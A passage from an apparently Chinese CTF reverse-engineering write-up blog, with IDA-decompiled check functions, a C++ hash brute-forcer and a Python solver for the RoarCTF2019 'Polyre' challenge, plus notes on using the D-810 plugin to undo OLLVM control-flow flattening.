&#123;</span><br><span class="line">    v7 = (<span class="type">void</span> *)sub_7FF724273ED0((__int64)&amp;qword_7FF7242AD260, (__int64)&amp;unk_7FF7242A7780);</span><br><span class="line">    _CallMemberFunction0(v7, sub_7FF7242742A0);</span><br><span class="line">    sub_7FF72427F480(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>在dll中找到String_to_long</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">String_to_long</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// [rsp+30h] [rbp-138h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+34h] [rbp-134h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+38h] [rbp-130h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-12Ch]</span></span><br><span class="line">  _QWORD *v7; <span class="comment">// [rsp+48h] [rbp-120h]</span></span><br><span class="line">  <span class="type">void</span> *BASE64_INPUT; <span class="comment">// [rsp+50h] [rbp-118h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+58h] [rbp-110h]</span></span><br><span class="line">  <span class="type">int</span> v10[<span class="number">8</span>]; <span class="comment">// [rsp+60h] [rbp-108h]</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// [rsp+80h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">std</span>::_Container_base0 *v12; <span class="comment">// [rsp+88h] [rbp-E0h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+90h] [rbp-D8h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+98h] [rbp-D0h]</span></span><br><span class="line">  <span class="type">char</span> *v15; <span class="comment">// [rsp+A0h] [rbp-C8h]</span></span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">std</span>::_Container_base0 *v16; <span class="comment">// [rsp+A8h] [rbp-C0h]</span></span><br><span class="line">  <span class="type">char</span> v17[<span class="number">32</span>]; <span class="comment">// [rsp+B0h] [rbp-B8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">32</span>]; <span class="comment">// [rsp+D0h] [rbp-98h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v19[<span class="number">32</span>]; <span class="comment">// [rsp+F0h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v20[<span class="number">32</span>]; <span class="comment">// [rsp+110h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v21[<span class="number">32</span>]; <span class="comment">// [rsp+130h] [rbp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7 = <span class="keyword">operator</span> <span class="built_in">new</span>(<span class="number">0x128</span>ui64);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    *v7 = <span class="number">9</span>i64;</span><br><span class="line">    <span class="function">eh vector constructor <span class="title">iterator</span><span class="params">(v7 + <span class="number">1</span>, <span class="number">0x20</span>ui64, <span class="number">9u</span>i64, sub_180003C90, (<span class="type">void</span> (__stdcall *)(<span class="type">void</span> *))sub_180003AF0)</span></span>;</span><br><span class="line">    v9 = (__int64)(v7 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_180003C90</span>(v20);</span><br><span class="line">  v11 = v18;</span><br><span class="line">  v12 = <span class="built_in">sub_180003CE0</span>((<span class="type">const</span> <span class="keyword">struct</span> std::_Container_base0 *)v18, a1);</span><br><span class="line">  BASE64_INPUT = (<span class="type">void</span> *)<span class="built_in">BASE64ENCODE</span>(v12);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)<span class="built_in">LEN0</span>(a1) &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_180003A60</span>((__int64)v20, (__int64)BASE64_INPUT);</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = v5;</span><br><span class="line">      <span class="keyword">if</span> ( v5 &gt;= (<span class="type">unsigned</span> __int64)<span class="built_in">LEN0</span>((__int64)v20) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v14 = <span class="built_in">sub_180003900</span>((__int64)v20, (__int64)v17, v5, <span class="number">4</span>);</span><br><span class="line">      <span class="built_in">sub_180003B20</span>(<span class="number">32</span>i64 * i + v9, v14);</span><br><span class="line">      <span class="built_in">sub_180003AF0</span>(v17);</span><br><span class="line">      <span class="built_in">sub_1800039E0</span>(<span class="number">32</span>i64 * i + v9, (__int64)&amp;unk_180034570);</span><br><span class="line">      v5 += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sub_180003C90</span>(v21);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">sub_180003A90</span>((__int64)v21, <span class="number">32</span>i64 * j + v9);</span><br><span class="line">      v15 = v19;</span><br><span class="line">      v16 = <span class="built_in">sub_180003CE0</span>((<span class="type">const</span> <span class="keyword">struct</span> std::_Container_base0 *)v19, (__int64)v21);</span><br><span class="line">      v10[j] = <span class="built_in">sub_180003390</span>(v16);              <span class="comment">// hash....</span></span><br><span class="line">    &#125;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v2 = (<span class="type">void</span> *)<span class="built_in">sub_180004B90</span>(&amp;qword_18003A200, <span class="string">&quot;-------Checking-----&quot;</span>);</span><br><span class="line">    _CallMemberFunction0(v2, (<span class="built_in">void</span> (__stdcall *)(<span class="type">void</span> *))sub_180004F60);</span><br><span class="line">    <span class="keyword">if</span> ( v10[<span class="number">0</span>] == <span class="number">0x6C43B2A7</span></span><br><span class="line">      &amp;&amp; v10[<span class="number">1</span>] == <span class="number">0x7954FD91</span></span><br><span class="line">      &amp;&amp; v10[<span class="number">2</span>] == <span class="number">0xA3E9532</span></span><br><span class="line">      &amp;&amp; v10[<span class="number">3</span>] == <span class="number">0xB87B5156</span></span><br><span class="line">      &amp;&amp; v10[<span class="number">4</span>] == <span class="number">0xDA847742</span></span><br><span class="line">      &amp;&amp; v10[<span class="number">5</span>] == <span class="number">0x2395E7F3</span></span><br><span class="line">      &amp;&amp; v10[<span class="number">6</span>] == <span class="number">0xA679D954</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v10[<span class="number">7</span>] == <span class="number">0xE1FAAFF7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sub_180003310</span>(v9, BASE64_INPUT);</span><br><span class="line">    <span class="built_in">sub_180003AF0</span>(v21);</span><br><span class="line">    <span class="built_in">sub_180003AF0</span>(v20);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_180003AF0</span>(v20);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md 这种函数写法很容易看漏掉某个…<br>这里先是作了个标准base64encode<br>然后四个字符一组(这里动调可以发现前面的base64input被分成了四个字符一组的几个组)<br>进行了hash变换</p><p>还藏得挺深的…</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">HASH___</span><span class="params">(__int64 *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  *a1 ^= <span class="number">0xC6A4A7935BD1E995</span>ui64 * (((<span class="number">0xC6A4A7935BD1E995</span>ui64 * a2) &gt;&gt; <span class="number">47</span>) ^ (<span class="number">0xC6A4A7935BD1E995</span>ui64 * a2));</span><br><span class="line">  *a1 *= <span class="number">0xC6A4A7935BD1E995</span>ui64;</span><br><span class="line">  result = *a1 + <span class="number">0xE6546B64</span>i64;</span><br><span class="line">  *a1 = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么就四个一组爆破 注意细节！ 最后跟enc[]数组check又要将unsigned __int64 转为unsigned int …</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">HASH</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> a1,<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> a2)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> result; <span class="comment">// rax</span></span><br><span class="line">  a1 ^= (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xC6A4A7935BD1E995</span> * ((((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xC6A4A7935BD1E995</span> * a2) &gt;&gt; <span class="number">47</span>) ^ ((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xC6A4A7935BD1E995</span> * a2));</span><br><span class="line">  a1 *= (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)<span class="number">0xC6A4A7935BD1E995</span>;</span><br><span class="line">  result = a1 + <span class="number">0xE6546B64</span>;</span><br><span class="line">  a1 = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> enc[]=&#123;<span class="number">0x6C43B2A7</span>,<span class="number">0x7954FD91</span>,<span class="number">0xA3E9532</span>,<span class="number">0xB87B5156</span>,<span class="number">0xDA847742</span>,<span class="number">0x2395E7F3</span>,<span class="number">0xA679D954</span>,<span class="number">0xE1FAAFF7</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">9</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">bool</span> vis = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> n1=<span class="number">32</span>;n1&lt;<span class="number">129</span>&amp;&amp;vis;n1++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> n2=<span class="number">32</span>;n2&lt;<span class="number">129</span>&amp;&amp;vis;n2++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> n3=<span class="number">32</span>;n3&lt;<span class="number">129</span>&amp;&amp;vis;n3++)</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> n4=<span class="number">32</span>;n4&lt;<span class="number">129</span>&amp;&amp;vis;n4++)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">                        res=<span class="built_in">HASH</span>(res,n1);</span><br><span class="line">                        res=<span class="built_in">HASH</span>(res,n2);</span><br><span class="line">                        res=<span class="built_in">HASH</span>(res,n3);</span><br><span class="line">                        res=<span class="built_in">HASH</span>(res,n4);</span><br><span class="line">                        <span class="keyword">if</span>((<span class="type">unsigned</span> <span class="type">int</span> )res == enc[i])</span><br><span class="line">                        &#123;</span><br><span class="line">                            vis = <span class="number">0</span>;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,n1,n2,n3,n4);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后爆破得到 R1hZe0lfaGF2ZV9ub19naXIxX2ZyaWVO<br>base64转一下即可</p><h1 id="RoarCTF2019"><a href="#RoarCTF2019" class="headerlink" title="RoarCTF2019"></a>RoarCTF2019</h1><h2 id="Polyre"><a href="#Polyre" class="headerlink" title="Polyre"></a>Polyre</h2><p>务必记录一下<br>神奇的插件 orz<br>在网上搜索ollvm反混淆 大概率搜不到这个神奇的plugin<br><strong>D-810</strong> !!!<br>在github上下载下来 将d-810文件夹和D-810.py移动到.&#x2F;idapro&#x2F;plugin下<br>然后打开IDA(最好用&gt;&#x3D;7.5 &lt;8.0的)ctrl+shift+D<br>启动！ 然后F5<br>控制流平坦化后的main:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v4; <span class="comment">// [rsp+1E0h] [rbp-110h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1E8h] [rbp-108h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+1ECh] [rbp-104h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+1F0h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">60</span>]; <span class="comment">// [rsp+220h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [rsp+25Ch] [rbp-94h]</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// [rsp+260h] [rbp-90h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+26Ch] [rbp-84h]</span></span><br><span class="line">  <span class="type">bool</span> v13; <span class="comment">// [rsp+272h] [rbp-7Eh]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v14; <span class="comment">// [rsp+273h] [rbp-7Dh]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+274h] [rbp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> *v16; <span class="comment">// [rsp+278h] [rbp-78h]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [rsp+284h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+288h] [rbp-68h]</span></span><br><span class="line">  <span class="type">bool</span> v19; <span class="comment">// [rsp+28Fh] [rbp-61h]</span></span><br><span class="line">  <span class="type">char</span> *v20; <span class="comment">// [rsp+290h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [rsp+298h] [rbp-58h]</span></span><br><span class="line">  <span class="type">bool</span> v22; <span class="comment">// [rsp+29Fh] [rbp-51h]</span></span><br><span class="line">  __int64 v23; <span class="comment">// [rsp+2A0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">bool</span> v24; <span class="comment">// [rsp+2AFh] [rbp-41h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+2B0h] [rbp-40h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+2B8h] [rbp-38h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+2C0h] [rbp-30h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+2C8h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [rsp+2D0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [rsp+2D4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">char</span> *v31; <span class="comment">// [rsp+2D8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [rsp+2E0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [rsp+2E4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">bool</span> v34; <span class="comment">// [rsp+2EBh] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="built_in">sizeof</span>(s1));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line">  v11 = s;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = i;</span><br><span class="line">    v13 = i &lt; <span class="number">64</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">64</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v14 = s[i];</span><br><span class="line">    v15 = v14;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = &amp;s[i];</span><br><span class="line">      *v16 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v17 = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = j;</span><br><span class="line">    v19 = j &lt; <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> ( j &gt;= <span class="number">6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v20 = s;</span><br><span class="line">    v4 = *(_QWORD *)&amp;s[<span class="number">8</span> * j];</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      v21 = k;</span><br><span class="line">      v22 = k &lt; <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( k &gt;= <span class="number">64</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v23 = v4;</span><br><span class="line">      v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v25 = <span class="number">2</span> * v4;</span><br><span class="line">        v26 = <span class="number">2</span> * v4;</span><br><span class="line">        v4 = (<span class="number">2</span> * v4) ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v27 = v4;</span><br><span class="line">        v28 = <span class="number">2</span> * v4;</span><br><span class="line">        v4 *= <span class="number">2LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v29 = k;</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = <span class="number">8</span> * j;</span><br><span class="line">    v31 = &amp;s1[<span class="number">8</span> * j];</span><br><span class="line">    *(_QWORD *)v31 = v4;</span><br><span class="line">    v32 = j + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v33 = <span class="built_in">memcmp</span>(s1, &amp;unk_402170, <span class="number">0x30</span>uLL);</span><br><span class="line">  v34 = v33 != <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这不清晰多了…<br>还有一个很烦的点 这个unsigned和signed绕来绕去的…(重点是分析符号位)<br>根据v4&lt;0的分支 乘2再xor一个奇数后肯定是一个奇数<br>而v4&gt;0时直接乘2 肯定是个偶数<br>那么根据奇偶就能知道v4之前是否为负数<br>那么我们逆向还原之前的v4就要保证v4为负数 为了保证这一点需要 |&#x3D; 0x8000000000000000<br>(当个知识点记住吧)<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0xBC8FF26D43536296</span>, <span class="number">0x520100780530EE16</span>, <span class="number">0x4DC0B5EA935F08EC</span>, <span class="number">0x342B90AFD853F450</span>, </span><br><span class="line">    <span class="number">0x8B250EBCAA2C3681</span>, <span class="number">0x55759F81A2C68AE4</span>, <span class="number">0xB0004B7679FA26B3</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    x = c</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span>(x&amp;<span class="number">1</span>==<span class="number">1</span>):</span><br><span class="line">            x ^= <span class="number">0xB0004B7679FA26B3</span></span><br><span class="line">            x //= <span class="number">2</span></span><br><span class="line">            x |= <span class="number">0x8000000000000000</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x //= <span class="number">2</span></span><br><span class="line">    <span class="built_in">print</span>((long_to_bytes(x).decode()[::-<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># flag&#123;6ff29390-6c20-4c56-ba70-a95758e3d1f8&#125;</span></span><br></pre></td></tr></table></figure><h1 id="网鼎杯2018"><a href="#网鼎杯2018" class="headerlink" title="网鼎杯2018"></a>网鼎杯2018</h1><h2 id="最好的语言"><a href="#最好的语言" class="headerlink" title="最好的语言"></a>最好的语言</h2><p>参考:<br><a href="https://www.wolai.com/ctfhub/hF9r3aJKC7d2uxwZMa85gp" target="_blank"> + </a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span 